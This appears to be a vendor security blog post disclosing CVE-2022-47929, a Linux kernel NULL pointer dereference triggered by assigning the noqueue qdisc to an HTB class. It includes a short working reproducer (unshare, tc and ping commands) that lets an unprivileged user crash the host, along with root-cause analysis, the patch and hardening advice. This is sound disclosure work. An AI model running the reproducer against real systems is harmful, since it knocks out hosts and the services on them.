<div class="post-content lh-copy gray1">
	<figure class="kg-card kg-image-card"><img src="https://blog.cloudflare.com/content/images/2023/01/image1-56.png" class="kg-image" alt="CVE-2022-47929: traffic control noqueue no problem?"></figure>
	<p>USER namespaces power the functionality of our favorite tools such as docker, podman, and kubernetes. <a href="https://blog.cloudflare.com/live-patch-security-vulnerabilities-with-ebpf-lsm/">We wrote about Linux namespaces back in June</a> and explained them like this:</p>
	<blockquote>Most of the namespaces are uncontroversial, like the UTS namespace which allows the host system to hide its hostname and time. Others are complex but straightforward - NET and NS (mount) namespaces are known to be hard to wrap your head around. Finally, there is this very special, very curious USER namespace. USER namespace is special since it allows the - typically unprivileged owner to operate as "root" inside it. It's a foundation to having tools like Docker to not operate as true root, and things like rootless containers.</blockquote>
	<p>Due to its nature, allowing unprivileged users access to USER namespace always carried a great security risk. With its help the unprivileged user can in fact run code that typically requires root. This code is often under-tested and buggy. Today we will look into one such case where USER namespaces are leveraged to exploit a kernel bug that can result in an unprivileged denial of service attack.</p>
	<h3 id="enter-linux-traffic-control-queue-disciplines">Enter Linux Traffic Control queue disciplines</h3>
	<p>In 2019, we were exploring leveraging <a href="https://man7.org/linux/man-pages/man8/tc.8.html#DESCRIPTION" target="_blank">Linux Traffic Control's</a> <a href="https://tldp.org/HOWTO/Traffic-Control-HOWTO/components.html#c-qdisc" target="_blank">queue discipline</a> (qdisc) to schedule packets for one of our services with the <a href="https://man7.org/linux/man-pages/man8/tc-htb.8.html" target="_blank">Hierarchy Token Bucket</a> (HTB) <a href="https://tldp.org/HOWTO/Traffic-Control-HOWTO/classful-qdiscs.html" target="_blank">classful qdisc</a> strategy. Linux Traffic Control is a user-configured system to schedule and filter network packets. Queue disciplines are the strategies in which packets are scheduled. In particular, we wanted to filter and schedule certain packets from an interface, and drop others into the <a href="https://linux-tc-notes.sourceforge.net/tc/doc/sch_noqueue.txt" target="_blank">noqueue</a> qdisc.</p>
	<p>noqueue is a special case qdisc, such that packets are supposed to be dropped when scheduled into it. In practice, this is not the case. Linux handles noqueue such that packets are passed through and not dropped (for the most part). The <a href="https://linux-tc-notes.sourceforge.net/tc/doc/sch_noqueue.txt" target="_blank">documentation</a> states as much. It also states that “It is not possible to assign the noqueue queuing discipline to physical devices or classes.” So what happens when we assign noqueue to a class?</p>
	<p>Let's write some shell commands to show the problem in action:</p><!--kg-card-begin: markdown-->
	<pre><code class="language-shell">1. $ sudo -i
2. # dev=enp0s5
3. # tc qdisc replace dev $dev root handle 1: htb default 1
4. # tc class add dev $dev parent 1: classid 1:1 htb rate 10mbit
5. # tc qdisc add dev $dev parent 1:1 handle 10: noqueue
</code></pre>
	<!--kg-card-end: markdown-->
	<ol>
		<li>First we need to log in as root because that gives us <a href="https://man7.org/linux/man-pages/man7/capabilities.7.html#DESCRIPTION" target="_blank">CAP_NET_ADMIN</a> to be able to configure traffic control.</li>
		<li>We then assign a network interface to a variable. These can be found with <code>ip a</code>. Virtual interfaces can be located by calling <code>ls /sys/devices/virtual/net</code>. These will match with the output from <code>ip a</code>.</li>
		<li>Our interface is currently assigned to the <a href="https://man7.org/linux/man-pages/man8/tc-pfifo_fast.8.html" target="_blank">pfifo_fast</a> qdisc, so we replace it with the HTB classful qdisc and assign it the handle of <code>1:</code>. We can think of this as the root node in a tree. The “default 1” configures this such that unclassified traffic will be routed directly through this qdisc which falls back to pfifo_fast queuing. (more on this later)</li>
		<li>Next we add a class to our root qdisc <code>1:</code>, assign it to the first leaf node 1 of root 1: <code>1:1</code>, and give it some reasonable configuration defaults.</li>
		<li>Lastly, we add the noqueue qdisc to our first leaf node in the hierarchy: <code>1:1</code>. This effectively means traffic routed here will be scheduled to noqueue</li>
	</ol>
	<p>Assuming our setup executed without a hitch, we will receive something similar to this kernel panic:</p><!--kg-card-begin: markdown-->
	<pre><code class="language-shell">BUG: kernel NULL pointer dereference, address: 0000000000000000
#PF: supervisor instruction fetch in kernel mode
...
Call Trace:
&lt;TASK&gt;
htb_enqueue+0x1c8/0x370
dev_qdisc_enqueue+0x15/0x90
__dev_queue_xmit+0x798/0xd00
...
&lt;/TASK&gt;

</code></pre>
	<!--kg-card-end: markdown-->
	<p>We know that the root user is responsible for setting qdisc on interfaces, so if root can crash the kernel, so what? We just do not apply noqueue qdisc to a class id of a HTB qdisc:</p><!--kg-card-begin: markdown-->
	<pre><code># dev=enp0s5
# tc qdisc replace dev $dev root handle 1: htb default 1
# tc class add dev $dev parent 1: classid 1:2 htb rate 10mbit // A
// B is missing, so anything not filtered into 1:2 will be pfifio_fast
</code></pre>
	<!--kg-card-end: markdown-->
	<p>Here, we leveraged the default case of HTB where we assign a class id 1:2 to be rate-limited (A), and implicitly did not set a qdisc to another class such as id 1:1 (B). Packets queued to (A) will be filtered to <a href="https://elixir.bootlin.com/linux/v6.2-rc1/source/net/sched/sch_htb.c#L620" target="_blank">HTB_DIRECT</a> and packets queued to (B) will be filtered into pfifo_fast.</p>
	<p>Because we were not familiar with this part of the codebase, we <a href="https://lore.kernel.org/all/CALrw=nEdA0asN4n7B3P2TyHKJ+UBPvoAiMrwkT42=fqp2-CPiw@mail.gmail.com/" target="_blank">notified</a> the mailing lists and created a ticket. The bug did not seem all that important to us at that time.</p>
	<p>Fast-forward to 2022, we are <a href="https://lwn.net/Articles/903580/" target="_blank">pushing</a> USER namespace creation hardening. We extended the Linux LSM framework with a new LSM hook: <a href="https://lore.kernel.org/all/20220815162028.926858-1-fred@cloudflare.com/" target="_blank">userns_create</a> to leverage <a href="https://blog.cloudflare.com/live-patch-security-vulnerabilities-with-ebpf-lsm/">eBPF LSM</a> for our protections, and encourage others to do so as well. Recently while combing our ticket backlog, we rethought this bug. We asked ourselves, “can we leverage USER namespaces to trigger the bug?” and the short answer is yes!</p>
	<h3 id="demonstrating-the-bug">Demonstrating the bug</h3>
	<p>The exploit can be performed with any classful qdisc that assumes a <a href="https://elixir.bootlin.com/linux/v6.2-rc1/source/include/net/sch_generic.h#L73" target="_blank">struct Qdisc.enqueue</a> function to not be NULL (more on this later), but in this case, we are demonstrating just with HTB.</p><!--kg-card-begin: markdown-->
	<pre><code class="language-shell">$ unshare -rU –net
$ dev=lo
$ tc qdisc replace dev $dev root handle 1: htb default 1
$ tc class add dev $dev parent 1: classid 1:1 htb rate 10mbit
$ tc qdisc add dev $dev parent 1:1 handle 10: noqueue
$ ping -I $dev -w 1 -c 1 1.1.1.1
</code></pre>
	<!--kg-card-end: markdown-->
	<p>We use the “lo” interface to demonstrate that this bug is triggerable with a virtual interface. This is important for containers because they are fed virtual interfaces most of the time, and not the physical interface. Because of that, we can use a container to crash the host as an unprivileged user, and thus perform a denial of service attack.</p>
	<h3 id="why-does-that-work">Why does that work?</h3>
	<p>To understand the problem a bit better, we need to look back to the original <a href="https://lore.kernel.org/all/1440703299-21243-1-git-send-email-phil@nwl.cc/#t" target="_blank">patch series</a>, but specifically this <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=d66d6c3152e8d5a6db42a56bf7ae1c6cae87ba48" target="_blank">commit</a> that introduced the bug. Before this series, achieving noqueue on interfaces relied on a hack that would set a device qdisc to noqueue if the device had a <a href="https://elixir.bootlin.com/linux/v6.2-rc1/source/net/sched/sch_api.c#L1263" target="_blank">tx_queue_len = 0</a>. The commit d66d6c3152e8 (“net: sched: register noqueue qdisc”) circumvents this by explicitly allowing noqueue to be added with the <code>tc</code> command without needing to get around that limitation.</p>
	<p>The way the kernel checks for whether we are in a noqueue case or not, is to simply check if a qdisc has a <a href="https://elixir.bootlin.com/linux/v6.2-rc1/source/net/core/dev.c#L4214" target="_blank">NULL enqueue()</a> function. Recall from earlier that noqueue does not necessarily drop packets in practice? After that check in the fail case, the following logic handles the noqueue functionality. In order to fail the check, the author had to <em>cheat</em> a reassignment from <a href="https://elixir.bootlin.com/linux/v6.2-rc1/source/net/sched/sch_generic.c#L628" target="_blank">noop_enqueue()</a> to <a href="https://elixir.bootlin.com/linux/v6.2-rc1/source/net/sched/sch_api.c#L142" target="_blank">NULL</a> by making <a href="https://elixir.bootlin.com/linux/v6.2-rc1/source/net/sched/sch_generic.c#L683" target="_blank">enqueue = NULL</a> in the init which is called <em>way after</em> <a href="https://elixir.bootlin.com/linux/v6.2-rc1/source/net/sched/sch_api.c#L131" target="_blank">register_qdisc()</a> during runtime.</p>
	<p>Here is where classful qdiscs come into play. The check for an enqueue function is no longer NULL. In this call path, it is now set to HTB (in our example) and is thus allowed to enqueue the struct skb to a <a href="https://elixir.bootlin.com/linux/v6.2-rc1/source/net/core/dev.c#L3778" target="_blank">queue</a> by making a call to the function <a href="https://elixir.bootlin.com/linux/v6.2-rc1/source/net/sched/sch_htb.c#L612" target="_blank">htb_enqueue()</a>. Once in there, HTB performs a <a href="https://elixir.bootlin.com/linux/v6.2-rc1/source/net/sched/sch_htb.c#L216" target="_blank">lookup</a> to pull in a qdisc assigned to a leaf node, and eventually attempts to <a href="https://elixir.bootlin.com/linux/v6.2-rc1/source/net/sched/sch_htb.c#L635" target="_blank">queue</a> the struct skb to the chosen qdisc which ultimately reaches this function:</p>
	<p><em>include/net/sch_generic.h</em></p><!--kg-card-begin: markdown-->
	<pre><code class="language-c">static inline int qdisc_enqueue(struct sk_buff *skb, struct Qdisc *sch,
				struct sk_buff **to_free)
{
	qdisc_calculate_pkt_len(skb, sch);
	return sch-&gt;enqueue(skb, sch, to_free); // sch-&gt;enqueue == NULL
}
</code></pre>
	<!--kg-card-end: markdown-->
	<p>We can see that the enqueueing process is fairly agnostic from physical/virtual interfaces. The permissions and validation checks are done when adding a queue to an interface, which is why the classful qdics assume the queue to not be NULL. This knowledge leads us to a few solutions to consider.</p>
	<h3 id="solutions">Solutions</h3>
	<p>We had a few solutions ranging from what we thought was best to worst:</p>
	<ol>
		<li>Follow tc-noqueue documentation and do not allow noqueue to be assigned to a classful qdisc</li>
		<li>Instead of checking for <a href="https://elixir.bootlin.com/linux/v6.2-rc1/source/net/core/dev.c#L4214" target="_blank">NULL</a>, check for <a href="https://elixir.bootlin.com/linux/v6.2-rc1/source/net/sched/sch_generic.c#L687" target="_blank">struct noqueue_qdisc_ops</a>, and reset noqueue to back to noop_enqueue</li>
		<li>For each classful qdisc, check for NULL and fallback</li>
	</ol>
	<p>While we ultimately went for the first option: <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=96398560f26aa07e8f2969d73c8197e6a6d10407" target="_blank">"disallow noqueue for qdisc classes"</a>, the third option creates a lot of churn in the code, and does not solve the problem completely. Future qdiscs implementations could forget that important check as well as the maintainers. However, the reason for passing on the second option is a bit more interesting.</p>
	<p>The reason we did not follow that approach is because we need to first answer these questions:</p>
	<p>Why not allow noqueue for classful qdiscs?</p>
	<p>This contradicts the documentation. The documentation does have some precedent for not being totally followed in practice, but we will need to update that to reflect the current state. This is fine to do, but does not address the behavior change problem other than remove the NULL dereference bug.</p>
	<p>What behavior changes if we do allow noqueue for qdiscs?</p>
	<p>This is harder to answer because we need to determine what that behavior should be. Currently, when noqueue is applied as the root qdisc for an interface, the path is to essentially allow packets to be processed. Claiming a fallback for classes is a different matter. They may each have their own fallback rules, and how do we know what is the right fallback? Sometimes in HTB the fallback is pass-through with HTB_DIRECT, sometimes it is pfifo_fast. What about the other classes? Perhaps instead we should fall back to the default noqueue behavior as it is for root qdiscs?</p>
	<p>We felt that going down this route would only add confusion and additional complexity to queuing. We could also make an argument that such a change could be considered a feature addition and not necessarily a bug fix. Suffice it to say, adhering to the current documentation seems to be the more appealing approach to prevent the vulnerability now, while something else can be worked out later.</p>
	<h3 id="takeaways">Takeaways</h3>
	<p>First and foremost, apply this <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=96398560f26aa07e8f2969d73c8197e6a6d10407" target="_blank">patch</a> as soon as possible. And consider hardening USER namespaces on your systems by setting <code>sysctl -w </code><a href="https://sources.debian.org/patches/linux/3.16.56-1+deb8u1/debian/add-sysctl-to-disallow-unprivileged-CLONE_NEWUSER-by-default.patch/" target="_blank"><code>kernel.unprivileged_userns_clone</code></a><code>=0</code>, which only lets root create USER namespaces in Debian kernels, <code>sysctl -w </code><a href="https://docs.kernel.org/admin-guide/sysctl/user.html?highlight=max_user_namespaces" target="_blank"><code>user.max_user_namespaces</code></a><code>=[number]</code> for a process hierarchy, or consider backporting these two patches: <code><a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=7cd4c5c2101cb092db00f61f69d24380cf7a0ee8" target="_blank">security_create_user_ns()</a></code> and the <a href="https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=ed5d44d42c95e8a13bb54e614d2269c8740667f9" target="_blank">SELinux implementation</a> &nbsp;(now in Linux 6.1.x) to allow you to protect your systems with either eBPF or SELinux. If you are sure you're not using USER namespaces and in extreme cases, you might consider turning the feature off with <code>CONFIG_USERNS=n</code>. This is just one example of many where namespaces are leveraged to perform an attack, and more are surely to crop up in varying levels of severity in the future.</p>
	<p>Special thanks to Ignat Korchagin and Jakub Sitnicki for code reviews and helping demonstrate the bug in practice.</p>
</div>